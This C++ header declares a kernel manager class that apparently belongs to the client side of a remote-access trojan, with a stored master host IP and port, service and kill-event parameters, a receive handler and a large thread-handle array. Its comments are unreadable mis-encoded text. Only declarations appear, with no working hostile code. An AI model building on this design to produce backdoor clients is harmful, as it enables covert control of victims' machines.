#pragma once

#include "Manager.h"


class CKernelManager : public CManager  
{
public:
	static	char	m_strMasterHost[256];   //�����ƶ˵�IP
	static	UINT	m_nMasterPort;          //�����ƶ˵�Port
	CKernelManager(CClientSocket *pClient, LPCTSTR lpszServiceName, DWORD dwServiceType, LPCTSTR lpszKillEvent, 
		LPCTSTR lpszMasterHost, UINT nMasterPort);
	virtual ~CKernelManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	bool	IsActived();
private:
	bool	m_bIsActived;
	UINT	m_nThreadCount;
	HANDLE	m_hThread[10000];     //�洢�����̵߳ľ��
};